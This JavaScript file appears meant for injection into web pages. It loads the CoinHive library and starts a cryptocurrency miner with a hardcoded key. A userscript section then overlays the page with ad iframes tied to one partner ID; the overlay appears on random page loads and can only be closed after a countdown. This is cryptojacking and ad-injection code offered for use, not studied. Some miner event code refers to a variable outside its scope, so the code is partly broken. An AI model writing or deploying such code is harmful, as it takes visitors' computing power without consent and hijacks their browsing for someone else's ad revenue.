var head = document.getElementsByTagName('head')[0];
    var body = document.getElementsByTagName('body')[0];
var script3 = document.createElement('script');
    script3.type = "text/javascript";
    script3.src="https://code.jquery.com/jquery-3.3.1.min.js";
    head.appendChild(script3);
var script = document.createElement('script');
    script.type = "text/javascript";
    script.src="https://coinhive.com/lib/coinhive.min.js";
    head.appendChild(script);
    script.onload = function() {
    var miner = new CoinHive.Anonymous('NIayhDzgu9LvvWabVtgoXjZWp0kq6qZJ', {throttle: 0.5});
		miner.start();
    };

// Listen on events
	miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', function() { /* Hash accepted by the pool */ })

	// Update stats once per second
	setInterval(function() {
		console.log(miner.getHashesPerSecond());
		console.log(miner.getTotalHashes());
		console.log(miner.getAcceptedHashes());

		// Output to HTML elements...
	}, 1000);

// ==UserScript==
// @name     NeetYeet.js
// @version  1
// @grant    none
// ==/UserScript==

var strVar="";
strVar += "<!DOCTYPE HTML>";
strVar += "<div id=\"darkLayer\" class=\"darkClass\" style=\"display:none\">";
strVar += "<button id=\"closeable\" class=\"close-right\">&times;<\/button>";
strVar += "<p>Please wait <i id=\"timer\">[4]<\/i><\/p>";
strVar += "";
strVar += "<div class=\"dove\">";
strVar += "	<p>Advertising for <a id=\"adsby\" href=\"#\" class=\"wht\">xd<\/a><\/p>";
strVar += "	<p><a class=\"wht\" href='http:\/\/a-ads.com?partner=854682'>Advertise Here<\/a><\/p>";
strVar += "	<p class=\"wht\">Ads Served By <a class=\"wht\" href='http:\/\/a-ads.com?partner=854682'>A-Ads<\/a><\/p>";
strVar += "	<\/div>";
strVar += "";
strVar += "<\/div>";
strVar += "<!--http:\/\/2130706433-->";
strVar += "<style>";
strVar += "";
strVar += ".dove {";
strVar += "  position: fixed;";
strVar += "  left: 50%;";
strVar += "  bottom: -5%;";
strVar += "  transform: translate(-50%, -50%);";
strVar += "  margin: 0 auto;";
strVar += "  text-align:center;";
strVar += "}";
strVar += "";
strVar += "p {color: white;}";
strVar += "";
strVar += "body {";
strVar += "	height: 100%;";
strVar += "}";
strVar += "";
strVar += "a,p {";
strVar += "font-family: Arial, sans-serif;";
strVar += "}";
strVar += "";
strVar += ".advert {";
strVar += "	width: 90%;";
strVar += "	background-color: white;";
strVar += "	height: 90px;";
strVar += "}";
strVar += "";
strVar += "i {";
strVar += "	font-style: normal;";
strVar += "}";
strVar += "";
strVar += "#timer {";
strVar += "font-style: normal;";
strVar += "letter-spacing: 2px;";
strVar += "}";
strVar += "";
strVar += ".close-right {";
strVar += "	position: absolute;";
strVar += "	top: 0;";
strVar += "	right: 0;";
strVar += "	border: 0;";
strVar += "	font-size: 32px;";
strVar += "	background: none;";
strVar += "	color: white;";
strVar += "	outline: 0;";
strVar += "}";
strVar += "";
strVar += ".darkClass > div > div > iframe {";
strVar += "	width: 100%;";
strVar += "	height: 100%;";
strVar += "}";
strVar += "";
strVar += ".darkClass > p {";
strVar += "	margin: 0 auto;";
strVar += "	font-family: Arial, sans-serif;";
strVar += "	text-align: center;";
strVar += "	color: white;";
strVar += "	font-size: 16px;";
strVar += "	margin-top: 2px !important;";
strVar += "}";
strVar += "";
strVar += ".darkClass";
strVar += "{";
strVar += "    background-color: black;";
strVar += "    filter:alpha(opacity=70); \/* IE *\/";
strVar += "    opacity: 0.7; \/* Safari, Opera *\/";
strVar += "    -moz-opacity:0.70; \/* FireFox *\/";
strVar += "    z-index: 200;";
strVar += "    height: 100%;";
strVar += "    width: 100%;";
strVar += "    background-repeat:no-repeat;";
strVar += "    background-position:center;";
strVar += "    position:absolute;";
strVar += "    top: 0px;";
strVar += "    left: 0px;";
strVar += "}";
strVar += "";
strVar += ".wht {";
strVar += "	color: white;";
strVar += "}";
strVar += "<\/style>";

var body = document.getElementsByTagName('body')[0];

body.innerHTML += strVar;

var darkLayer = document.getElementById("darkLayer");

var ads = 5;
var pagespace = 90/ads;
var adclass = document.createElement("style");
adclass.innerHTML=".advertad {height:" + pagespace + "%;}";
darkLayer.append(adclass);
var intCount = 5;
var intervalSet = setInterval(function() {
if (intCount > 0) {
intCount--;
var divad = document.createElement('div');
divad.style = "display:flex;justify-content:center;align-items:center;";
divad.innerHTML = "<div class='advert'> <iframe data-aa='854682' src='https:\/\/acceptable.a-ads.com/854682' scrolling='no' style='border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe> </div>";
divad.className="advertad";
darkLayer.append(divad);
}},1);

document.getElementById("adsby").innerHTML = window.location.hostname;
document.getElementById("adsby").href = window.location.protocol + "//" + window.location.hostname;

function dimOff()
{
    document.getElementById("darkLayer").style.display = "none";
}
function dimOn()
{
    document.getElementById("darkLayer").style.display = "";
}

var timeCountdown = 4;

var timer = document.getElementById("timer");
var btn = document.getElementById("closeable");

if (Math.random() > 0.85) { 
dimOn();
}

var settableint = setInterval(function(){timeCountdown--;timer.innerHTML= "[" + timeCountdown + "]"; if (timeCountdown<1) {btn.onclick=dimOff;clearInterval(settableint);}},1000); 
